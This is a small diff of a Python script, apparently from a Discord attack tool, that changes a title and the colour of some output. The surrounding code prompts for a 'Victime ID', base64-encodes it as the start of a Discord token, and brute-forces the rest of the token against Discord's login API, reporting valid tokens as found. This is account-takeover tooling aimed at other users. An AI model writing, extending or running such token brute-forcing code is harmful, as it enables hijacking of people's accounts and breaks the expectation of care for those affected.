@@ -6,7 +6,7 @@ import random
 import string
 import requests
 
-Title("Token To Id")
+Title("Discord Token To Id")
 
 userid = input(f"{color.RED}\n[?] | Victime ID -> {color.RESET}")
 encodedBytes = base64.b64encode(userid.encode("utf-8"))
@@ -32,11 +32,11 @@ if brute in ['y', 'Y', 'Yes', 'yes']:
             bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)
 
             if bruh.status_code == 200:
-                    print(f"{color.GREEN}[X] | {color.CYAN}{token}{color.GREEN} | Token Found{color.RESET}")
+                    print(f"{color.GREEN}[X] | {color.WHITE}{token}{color.GREEN} | Token Found{color.RESET}")
                     Continue()
 
             else:
-                    print(f"{color.RED}[X] | {color.CYAN}{token}{color.RED} | Token Invalid{color.RESET}")
+                    print(f"{color.RED}[X] | {color.WHITE}{token}{color.RED} | Token Invalid{color.RESET}")
 
     threads = []
     try:
